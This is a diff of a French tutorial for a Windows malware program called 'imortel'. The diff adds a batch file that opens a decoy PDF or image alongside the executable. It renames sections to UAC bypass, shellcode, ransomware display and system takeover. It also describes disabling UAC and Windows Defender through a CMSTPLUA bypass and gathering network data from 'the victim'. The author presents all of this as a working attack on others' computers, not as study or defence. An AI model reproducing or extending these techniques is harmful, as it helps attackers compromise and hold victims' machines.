@@ -110,7 +110,7 @@ Créez un fichier texte nommé **lance.bat** (clic droit -> Nouveau -> Document 
 Dans ce fichier, insérez exactement ces deux lignes :
 ```bash
 start "" "imortel.pdf" ou "imortel.png"
-start "" "imortels.exe"
+start "" "imortel.exe"
 ```
 Ce fichier batch a pour rôle de :
 
@@ -371,15 +371,14 @@ g++ imortel.cpp -o imortel.exe -luser32 -lgdi32 -lshell32 -lwinmm -lole32 -lolea
   imortel.cpp
   │
   ├── [BLOC 01]  INCLUDES & HEADERS
-  ├── [BLOC 02]  CONSTANTES & MACROS
-  ├── [BLOC 03]  DÉCLARATIONS GLOBALES
-  ├── [BLOC 04]  WinMain() — point d'entrée
-  ├── [BLOC 05]  RegisterClassEx() — enregistrement fenêtre
-  ├── [BLOC 06]  CreateWindowEx() — création fenêtre
-  ├── [BLOC 07]  GetMessage() — boucle de messages
-  ├── [BLOC 08]  WindowProc() — gestionnaire d'événements
-  ├── [BLOC 09]  GDI / Rendu graphique
-  └── [BLOC 10]  Fonctions utilitaires / logique métier
+  ├── [BLOC 02]  DIRECTIVES DE LIAISON COM
+  ├── [BLOC 03]  DÉFINITIONS COM POUR LE BYPASS UAC
+  ├── [BLOC 04]  FONCTION DE BYPASS UAC
+  ├── [BLOC 05]  SHELLCODE MALVEILLANT
+  ├── [BLOC 06]  FONCTION D'EXÉCUTION DU SHELLCODE
+  ├── [BLOC 07]  FONCTIONS D'AFFICHAGE RANSOMWARE
+  ├── [BLOC 08]  INTERCEPTION NEUTRALISÉE DES ENTRÉES
+  └── [BLOC 09]  PRISE DE CONTRÔLE SYSTÈME
 ```
 
 ---
@@ -689,48 +688,6 @@ void openPowerShellWithCommands() {
 ```
 
 > **Conçu pour compromettre sérieusement la sécurité Windows en deux étapes principales.** La fonction `openBrowser()` force l'ouverture du navigateur web par défaut de la victime sur l'adresse de mon site `(https://imortel.fr`. Ensuite, la fonction `openPowerShellWithCommands()` est la plus dangereuse : elle exécute une série de commandes PowerShell avec les droits d'administrateur. Pour y parvenir, elle utilise d'abord une technique de contournement du Contrôle de compte d'utilisateur (UAC) via `BypassUAC_CMSTPLUA`. Une fois les droits obtenus, le script exécute des commandes critiques que j'ai mise dans le scrip : il ***désactive l'UAC*** pour autoriser les futures exécutions sans confirmation de manière sûre à 100%, il ***désactive la protection en temps réel de Windows Defender*** pour rendre la machine invisible aux antivirus, puis j’ai rajouté la fameuse petite commande basique bonus qui affiche les informations de configuration réseau avec un `ipconfig /all` pour cartographier le réseau de la victime (possible d’effectuer l’envoi de ces informations réseau vers un serveur distant). ***En résumé, ce code peut être entièrement personnalisé et transformer en un système sans défense et vulnérable.***
-
----
-
-### ▸ BLOC 10 — FONCTIONS UTILITAIRES
-
-> 📌 **Remplace le code ci-dessous par tes vraies fonctions utilitaires**
-
-```cpp
-// ============================================================
-//  BLOC 10 — FONCTIONS UTILITAIRES / LOGIQUE MÉTIER
-//  Fonctions auxiliaires appelées depuis WindowProc ou WinMain
-// ============================================================
-
-// ── Ouvre un fichier avec l'application par défaut ──────────
-void OpenFile(LPCTSTR szPath) {
-    ShellExecute(
-        NULL,           // Fenêtre parente
-        TEXT("open"),   // Verbe : "open", "runas", "print"
-        szPath,         // Chemin du fichier
-        NULL,           // Paramètres (NULL = aucun)
-        NULL,           // Répertoire de travail
-        SW_SHOWNORMAL   // Mode d'affichage
-    );
-}
-
-// ── Affiche une boîte de dialogue d'erreur ──────────────────
-void ShowError(LPCTSTR szMsg) {
-    MessageBox(
-        g_hwnd,
-        szMsg,
-        TEXT("IMORTEL — Erreur"),
-        MB_ICONERROR | MB_OK
-    );
-}
-
-// ── Joue un son système ─────────────────────────────────────
-void PlayBeep(DWORD dwFreq, DWORD dwDuration) {
-    Beep(dwFreq, dwDuration);   // Fréquence Hz, durée ms
-}
-```
-
-> **Explication à remplacer** — `ShellExecute` est la fonction la plus polyvalente de `shell32` : elle ouvre n'importe quel fichier avec l'application associée par Windows (comme un double-clic). Le verbe `"runas"` permet de demander une élévation UAC. `MessageBox` est la boîte de dialogue synchrone la plus simple — elle bloque le thread jusqu'à ce que l'utilisateur clique.
 
 ---
 
